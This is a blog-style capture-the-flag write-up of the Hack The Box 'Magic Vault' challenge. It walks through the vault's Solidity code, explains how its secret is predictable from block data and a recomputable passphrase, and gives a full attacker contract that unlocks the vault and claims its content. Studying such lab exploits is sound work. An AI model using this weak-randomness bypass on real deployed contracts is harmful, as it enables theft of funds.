---
layout: post
title:  "[Challenge] HTB - Magic Vault"
date:   2023-08-29 00:21:16 -0300
categories: jekyll update
---

Today we gonna solve the "Magic Vault" challenge from hack the box

This challange and the next ones i gonna skip the configuration and interaction with the blockchain because is much time that i need to explain step by step

We gonna focus in the important things like :

- Looking the Solidity files
- Understand what we need to do to solve the challenge
- Understand the code flow
- Understand the vulnerability
- Explain how we can solve the challenge
- Solve


# The challenge description : 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/35599bb0-4d7a-4e2b-ae80-d3d10a7d3a00)


# Looking the Solidity files
## Setup.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Vault} from "./Vault.sol";

contract Setup {
    Vault public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Vault();
    }

    function isSolved() public view returns (bool) {
        return TARGET.mapHolder() != address(TARGET);
    }
}

```

## Vault.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Vault {
    struct Map {
        address holder;
    }

    Map map;
    address public owner;
    bytes32 private passphrase;
    uint256 public nonce;
    bool public isUnlocked;

    constructor() {
        owner = msg.sender;
        passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
        map = Map(address(this));
    }

    function mapHolder() public view returns (address) {
        return map.holder;
    }

    function claimContent() public {
        require(isUnlocked);
        map.holder = msg.sender;
    }

    function unlock(bytes16 _password) public {
        uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
        uint128 _input = uint128(_password);
        require(_input != _secretKey, "Case 1 failed");
        require(uint64(_input) == _secretKey, "Case 2 failed");
        require(uint64(bytes8(_password)) == uint64(uint160(owner)), "Case 3 failed");
        isUnlocked = true;
    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function _magicPassword() private returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
}

```

# Understand what we need to do to solve the challenge 

Ok, so here we need to use the `unlock` function from `Vault.sol` to unlock the magic vault and claim the reward using the `claimContent` function, after this we can claim the `flag` to solve the challenge


# Understand the code flow


Let's take a look to the `unlock` function

```solidity
function unlock(bytes16 _password) public {
    uint128 _secretKey = uint128(bytes16(_magicPassword()) >> 64);
    uint128 _input = uint128(_password);
    require(_input != _secretKey, "Case 1 failed");
    require(uint64(_input) == _secretKey, "Case 2 failed");
    require(uint64(bytes8(_password)) == uint64(uint160(owner)), "Case 3 failed");
    isUnlocked = true;
}
```

Here we need to understand some things about the `unlock` function, like :

- How the `_secretKey` are created
- How to pass the 3 requires
- And the most important things, what exactly means `>>`, why there a converting to a different `type` and what exactly this means

So let's start taking a look of what do `_magicPassword`

```solidity
function _magicPassword() private returns (bytes8) {
    uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
    uint128 _key2 = uint128(_generateKey(2));
    bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
    return (_secret >> 32 | _secret << 16);
}
```

In a general summary we can see this function call two times the `_generateKey` function with different arguments, after this the code are using that two results generate the `_secret` and returs a `bytes8` using the `>>`, but what this `>>` means ?, let's take a look : 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/9e91ab51-5a56-4183-9039-7876f00c2748)

With this we can understand better now what's happend in the code, so let's keep reading the code line per line to understand better what the `_generateKey` does because is called two times to generate the `_magicPassword`




Lets divide the instructions and see what do one per one

```solidity
uint256 _key1 = _generateKey(block.timestamp % 2 + 1);
```

In this first key returns an `uint256` and if you have some experience in blockchain may be you know the block.timestamp is the first vulnerability, because this can be predicted if this are used to generate a key, so in this case this are generating a key based in the result of the modulus + 1, so in this case are passing an argument with the values `1` or `2`

```solidity
uint128 _key2 = uint128(_generateKey(2));
```

In this second key returns a `uint128` and the argument used in the `_generayeKey` function is the fixed value `2`

So now let's take a look of what `_generateKey` function do

```solidity
function _generateKey(uint256 _reductor) private returns (uint256 ret) {
    ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
    nonce++;
}
```

In a general summary this function use the `_reductor`, for example `1` or `2` mentioned before and is used to subtract the reductor from the actual block.number, and then are converting the result into a differents 
 value types, and then are incrementing the nonce, so to understand this more in deep you need to understand what exactly do all conversions used : 

 - blockhash => receive : uint | returns : bytes32
 - uint256 => receive : uint and others values like bytes32 | returns : uint256
 - abi.encodePacked => receive :  much types in this case a uint256 | returns : bytes
 - keccak256 => receive :  bytes | returns : bytes32

So with this you can understand better what exactly the code are doing, but if you are smart may be you are asking your self what happend if the `uint256` is converting to a lower uint, well my friend, this is called explicit conversion, take a look : 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/7c1cea00-bd58-4d2f-b432-4aeecf021b19)

So right now, i know you are understanding better the code, and if not, take your time

<img src="https://media.tenor.com/tomRHuKfMCYAAAAd/korone-inugami-confused.gif" width="200" height="200" />

We have the first and most important part of the challenge to solved, of how the password are created using the `_magicPassword` and `_generateKey` functions and we understand what the bitwise and explicit conversion do to create the magic password

# Understand the vulnerability

The vulnerability here is the `block.timestamp` and how is used to generated the key using the bitwise, explict conversions, and what exactly returns, also wee can see the `passphrase` is `public`, so we can calculate that too, and if you are smart and do the conversions you gonna see this `passphrase` is the same ever no matter in what time the smart contract is deployed

So with this we can start coding the solution in solidity creating an own smart contract that can interact with the Target, in this case the `Vault.sol` to solve it

# Explain how we can solve the challenge

To solve it, is simple, you just need to replicate the functions used in the vault, and call the function `unlock`

To bypass the require you need to understand well what the explicit conversion and bitwise do

After that you gonna understand the solution is divided in two parts of bytes8 from a bytes16 : 

- first bytes8 => the owner bytes8
- second bytes8 => the _secretKey

So in a general summary the right answer for the `_password` is a bytes16 that is composed with `0x[bytes8FromOwner + bytes8FromSecretKey]` 

So the code to solved is the next : 

```solidity

contract KypanzAttackVault {
    
    Vault public vault;
    bytes32 public passphrase;
    uint256 public nonce;

    constructor(address _vault) {
        vault = Vault(_vault);
        passphrase = bytes32(keccak256(abi.encodePacked(uint256(blockhash(block.timestamp)))));
    }

    function attack() public {
        bytes16 _thePassword = magicPasswordBypass();
        vault.unlock(_thePassword);
    }

    function setNonce() public {
        nonce = vault.nonce();
    }

    function magicPasswordBypass() private returns(bytes16 _password) {
        
        // 1 - [ Replication ] => "_magicPassword" + Shift
        uint256 _key1 = _generateKey((block.timestamp % 2) + 1);
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        bytes8 _secretShift = (_secret >> 32 | _secret << 16);
        bytes16 toBytes16 = bytes16(_secretShift);
        bytes16 _secretFinalShift = toBytes16 >> 64;

        // 2 - [ To Bypass the require ] Adding the first bytes8 from the owner
        bytes memory _toBytes = abi.encodePacked(uint64((uint160(vault.owner()))));
        bytes8 _first8Bytes = bytes8(_toBytes);
        _password = _first8Bytes | _secretFinalShift;
        
        // This returned value is like : 0x[_first8bytes + _secretFinalShift] => result => bytes16
        return _password;
    }

    function _generateKey(uint256 _reductor) private returns (uint256 ret) {
        ret = uint256(
            keccak256(
                abi.encodePacked(
                    uint256(blockhash(block.number - _reductor)) + nonce
                )
            )
        );
        nonce++;
    }

}
```


So after run this code in the HTB ( Hack the box ) blockchain and run the  `attack` function and then the `ìsUnlocked` we can see the next : 

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/18d697c3-1a86-4c49-b7cb-37dabc81639d)

Then we need to call the last function `claimContent` function and now you can run to the url and claim the challenge flag : 

<img src="https://media.tenor.com/ULBhMI0HW-oAAAAC/running-anime.gif" width="200" height="200" />

![image](https://github.com/kypanz/kypanz.github.io/assets/37570367/38ac54e3-616f-4dc9-ac24-805242596f79)


## If you like it, please follow me in github, have a nice week

<img src="https://media.tenor.com/77hxEuhRcFcAAAAd/gecko-lizard.gif" width="300" height="300" >
